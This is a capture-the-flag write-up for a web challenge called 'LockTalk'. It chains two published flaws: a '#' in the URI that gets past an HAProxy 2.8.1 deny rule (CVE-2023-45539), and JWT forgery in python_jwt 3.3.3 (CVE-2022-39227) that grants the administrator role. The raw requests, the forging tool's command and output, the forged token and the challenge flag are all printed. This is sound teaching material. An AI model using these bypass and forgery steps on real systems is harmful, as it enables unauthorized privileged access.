# LockTalk - Medium

In this challenge, participants are provided with a website and the Python source code. 
![image](https://github.com/ITSEC-ASIA-ID/Competitions/assets/49203884/8b6990b6-ecdf-46ca-a345-15e88a7d669d)


## Solution

There are several API endpoints in the source code, most of the endpoints has Authorization except `/get_ticket` endpoint. But the `/get_ticket` endpoint is denied in HAProxy config.
> /conf/haproxy.cfg
> ```cfg
> frontend haproxy
>     bind 0.0.0.0:1337
>     default_backend backend
> 
>     http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }
>     
> ```

The goal in this challenge is able to sent request to `/api/v1/flag` with Authorization `role` = `administrator`.

> /challenge/app/api/routes.py
> ```py
> @api_blueprint.route('/flag', methods=['GET'])
> @authorize_roles(['administrator'])
> def flag():
>    return jsonify({'message': current_app.config.get('FLAG')}), 200
> ```

In `Dockerfile`, this challenge using HAProxy 2.8.1

> /Dockerfile
> ```Dockerfile
> RUN wget https://www.haproxy.org/download/2.8/src/haproxy-2.8.1.tar.gz && \
>    tar zxvf haproxy-*.tar.gz && cd haproxy-* && \
>    make TARGET=linux-musl && \
>    make install
> ```

This HAProxy version is vulnerable to CVE-2023-45539 that include `#` as a URI component, this can leads to bypass the restriction that has been configured.

```
GET /api/v1/get_ticket# HTTP/1.1
[..snip..]

```
![image](https://github.com/ITSEC-ASIA-ID/Competitions/assets/49203884/cb3201da-1bdb-4896-a227-fb64f9db5a22)

Second vulnerability is in python_jwt version 3.3.3.

> /conf/requirements.txt
> ```
> python_jwt==3.3.3
> ```

This version is vulnerable to CVE-2022-39227 that can forge new JWT tokens without knowing the secret key. We can use https://github.com/user0x1337/CVE-2022-39227 to change the `role` to `administrator`.

```
➜ python3 cve_2022_39227.py -j "eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTA4NjMyNDUsImlhdCI6MTcxMDg1OTY0NSwianRpIjoidE85dEZ2YzFfaFU4X2ZlNkRKRHdKUSIsIm5iZiI6MTcxMDg1OTY0NSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.JkosoYpVtrNa6jdGpVUcnNV86ercgKQ6J4BBnKJVu7BimfEhiycvFb3O7-AHd152_ok-GfzStiiiucz2oHA9yhJlQ8nHEvPqertVKqKynPqrFOKqH1M3YQsNyFR2LhklR3LfXojQQaX5lEBLTbNS0unL5IDv43wZiTeW72GYtwN4t9FeBnKyF1bpLRk0LzPM7s4vEtSBTgtGoE4jco5UbwQgDi0RG6qI-_CjO66hO3oT21YNgBKEf3pUFeO3VCcaKijUPUX0MYQWp8_qClOWZAXBpfIi_kFsX5UP5CIEGm5Fyl3Y4YzUN0TyoY34lQJadeAO4CFCkVFOEWIpb8BOjQ" -i "role=administrator"
[+] Retrieved base64 encoded payload: eyJleHAiOjE3MTA4NjMyNDUsImlhdCI6MTcxMDg1OTY0NSwianRpIjoidE85dEZ2YzFfaFU4X2ZlNkRKRHdKUSIsIm5iZiI6MTcxMDg1OTY0NSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ
[+] Decoded payload: {'exp': 1710863245, 'iat': 1710859645, 'jti': 'tO9tFvc1_hU8_fe6DJDwJQ', 'nbf': 1710859645, 'role': 'guest', 'user': 'guest_user'}
[+] Inject new "fake" payload: {'exp': 1710863245, 'iat': 1710859645, 'jti': 'tO9tFvc1_hU8_fe6DJDwJQ', 'nbf': 1710859645, 'role': 'administrator', 'user': 'guest_user'}
[+] Fake payload encoded: eyJleHAiOjE3MTA4NjMyNDUsImlhdCI6MTcxMDg1OTY0NSwianRpIjoidE85dEZ2YzFfaFU4X2ZlNkRKRHdKUSIsIm5iZiI6MTcxMDg1OTY0NSwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9

[+] New token:
 {"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTA4NjMyNDUsImlhdCI6MTcxMDg1OTY0NSwianRpIjoidE85dEZ2YzFfaFU4X2ZlNkRKRHdKUSIsIm5iZiI6MTcxMDg1OTY0NSwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTA4NjMyNDUsImlhdCI6MTcxMDg1OTY0NSwianRpIjoidE85dEZ2YzFfaFU4X2ZlNkRKRHdKUSIsIm5iZiI6MTcxMDg1OTY0NSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"JkosoYpVtrNa6jdGpVUcnNV86ercgKQ6J4BBnKJVu7BimfEhiycvFb3O7-AHd152_ok-GfzStiiiucz2oHA9yhJlQ8nHEvPqertVKqKynPqrFOKqH1M3YQsNyFR2LhklR3LfXojQQaX5lEBLTbNS0unL5IDv43wZiTeW72GYtwN4t9FeBnKyF1bpLRk0LzPM7s4vEtSBTgtGoE4jco5UbwQgDi0RG6qI-_CjO66hO3oT21YNgBKEf3pUFeO3VCcaKijUPUX0MYQWp8_qClOWZAXBpfIi_kFsX5UP5CIEGm5Fyl3Y4YzUN0TyoY34lQJadeAO4CFCkVFOEWIpb8BOjQ"}

Example (HTTP-Cookie):
------------------------------
auth={"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTA4NjMyNDUsImlhdCI6MTcxMDg1OTY0NSwianRpIjoidE85dEZ2YzFfaFU4X2ZlNkRKRHdKUSIsIm5iZiI6MTcxMDg1OTY0NSwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTA4NjMyNDUsImlhdCI6MTcxMDg1OTY0NSwianRpIjoidE85dEZ2YzFfaFU4X2ZlNkRKRHdKUSIsIm5iZiI6MTcxMDg1OTY0NSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"JkosoYpVtrNa6jdGpVUcnNV86ercgKQ6J4BBnKJVu7BimfEhiycvFb3O7-AHd152_ok-GfzStiiiucz2oHA9yhJlQ8nHEvPqertVKqKynPqrFOKqH1M3YQsNyFR2LhklR3LfXojQQaX5lEBLTbNS0unL5IDv43wZiTeW72GYtwN4t9FeBnKyF1bpLRk0LzPM7s4vEtSBTgtGoE4jco5UbwQgDi0RG6qI-_CjO66hO3oT21YNgBKEf3pUFeO3VCcaKijUPUX0MYQWp8_qClOWZAXBpfIi_kFsX5UP5CIEGm5Fyl3Y4YzUN0TyoY34lQJadeAO4CFCkVFOEWIpb8BOjQ"}
```

Then send request to `/api/v1/flag` with new JWT token as Authorization header:
```
GET /api/v1/flag HTTP/1.1
Authorization: {"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTA4NjMyNDUsImlhdCI6MTcxMDg1OTY0NSwianRpIjoidE85dEZ2YzFfaFU4X2ZlNkRKRHdKUSIsIm5iZiI6MTcxMDg1OTY0NSwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTA4NjMyNDUsImlhdCI6MTcxMDg1OTY0NSwianRpIjoidE85dEZ2YzFfaFU4X2ZlNkRKRHdKUSIsIm5iZiI6MTcxMDg1OTY0NSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"JkosoYpVtrNa6jdGpVUcnNV86ercgKQ6J4BBnKJVu7BimfEhiycvFb3O7-AHd152_ok-GfzStiiiucz2oHA9yhJlQ8nHEvPqertVKqKynPqrFOKqH1M3YQsNyFR2LhklR3LfXojQQaX5lEBLTbNS0unL5IDv43wZiTeW72GYtwN4t9FeBnKyF1bpLRk0LzPM7s4vEtSBTgtGoE4jco5UbwQgDi0RG6qI-_CjO66hO3oT21YNgBKEf3pUFeO3VCcaKijUPUX0MYQWp8_qClOWZAXBpfIi_kFsX5UP5CIEGm5Fyl3Y4YzUN0TyoY34lQJadeAO4CFCkVFOEWIpb8BOjQ"}
[..snip..]

```

![image](https://github.com/ITSEC-ASIA-ID/Competitions/assets/49203884/89f51c48-a569-490f-8516-fd49e20df8b8)


## Flag
HTB{h4Pr0Xy_n3v3r_D1s@pp01n4s}
